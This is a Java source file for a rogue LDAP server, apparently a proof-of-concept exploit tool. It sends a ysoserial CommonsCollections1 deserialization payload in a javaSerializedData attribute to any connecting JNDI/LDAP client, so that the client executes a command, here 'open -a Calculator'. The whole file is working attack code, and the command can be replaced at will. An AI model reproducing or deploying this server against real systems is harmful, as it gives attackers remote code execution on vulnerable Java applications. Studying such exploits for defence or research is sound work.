
import com.chaosinmotion.asn1.BerOutputStream;
import com.chaosinmotion.asn1.Tag;
import com.turkcelltech.jac.ASN1Integer;
import com.turkcelltech.jac.OctetString;
import com.turkcelltech.jac.Sequence;
import com.turkcelltech.jac.Set;
import ysoserial.payloads.CommonsCollections1;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;

/**
 * @Author: r00t4dm
 * @Date: 2022/1/7 3:36 下午
 */
public class LdapServer {

    private static byte[] hexStringToByteArray (String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i+=2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i + 1), 16));
        }
//        System.out.println(Arrays.toString(data));
        System.out.println(new String(data));
        return data;
    }

    private static String bytesToHex (byte[] bytes) {
        char[] hexArray = "0123456789ABCDEF".toCharArray();
        char[] hexChars = new char[bytes.length * 2];
        for (int i = 0; i < bytes.length; i++) {
            int v = bytes[i] & 0xFF;
            hexChars[i * 2] = hexArray[v >>> 4];
            hexChars[i * 2 + 1] = hexArray[v & 0x0F];
        }
        return new String(hexChars);
    }

    private static byte[] make_stage_reply () throws Exception{
        Object payload = CommonsCollections1.class.newInstance().getObject("open -a Calculator");
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(payload);

        Sequence sq = new Sequence();
        sq.addElement(new OctetString("javaClassName".getBytes()));
        Set s0 = new Set();
        s0.addElement(new OctetString("test".getBytes()));
        sq.addElement(s0);

        Sequence sq1 = new Sequence();
        sq1.addElement(new OctetString("javaSerializedData".getBytes()));
        Set s = new Set();
        s.addElement(new OctetString(baos.toByteArray()));
        sq1.addElement(s);

        Sequence sq2 = new Sequence();
        sq2.addElement(sq);
        sq2.addElement(sq1);

        Sequence sq3 = new Sequence();
        sq3.addElement(new OctetString("cn=test, dc=example, dc=com".getBytes()));
        sq3.addElement(sq2);
        sq3.setTagClass(Tag.APPLICATION);
        sq3.setTagNumber(4);

        Sequence sqall = new Sequence();
        sqall.addElement(new ASN1Integer(3L));
        sqall.addElement(sq3);
        ByteArrayOutputStream opt = new ByteArrayOutputStream();
        sqall.encode(new BerOutputStream(opt, BerOutputStream.ENCODING_DER));
        return opt.toByteArray();
    }

    private static void real_ldap_packet (Socket socket) {
        try {
            InputStream sin = socket.getInputStream();
            byte[] sinb = new byte[2];
            sin.read(sinb); // 读入sinb缓冲区
            if (sinb[0] != '0') {
                return;
            }

            int length = (char) (sinb[1] & 0xFF);
            if ((length & (1 << 7)) != 0) {
                int length_bytes_length = length ^ (1 << 7);
                byte[] length_bytes = new byte[length_bytes_length];
                sin.read(length_bytes); // 读入length_bytes缓冲区
                int sum = 0;
                for (int i = 0; i < length_bytes.length; i++) {
                    sum += (length_bytes[i] & 0xFF);
                }
                length = sum;
            }

            byte[] tmp = new byte[length];
            sin.read(tmp);
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void socketServer () {
        try {
            ServerSocket socket = new ServerSocket(21001);
            Socket ss = socket.accept();
            OutputStream out = new BerOutputStream(ss.getOutputStream());
            real_ldap_packet(ss);
            out.write(hexStringToByteArray("300c02010161070a010004000400"));
            out.flush();
            real_ldap_packet(ss);
            out.write(hexStringToByteArray("3034020102642f04066f753d777466302530230411737562736368656d61537562656e747279310e040c636e3d737562736368656d61"));
            out.write(hexStringToByteArray("300c02010265070a010004000400"));
            out.flush();
            real_ldap_packet(ss);

            out.write(make_stage_reply());
            out.write(hexStringToByteArray("300c02010161070a010004000400"));
            out.flush();
            out.close();
            ss.close();
            socket.close();

        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {

        socketServer();
    }
}
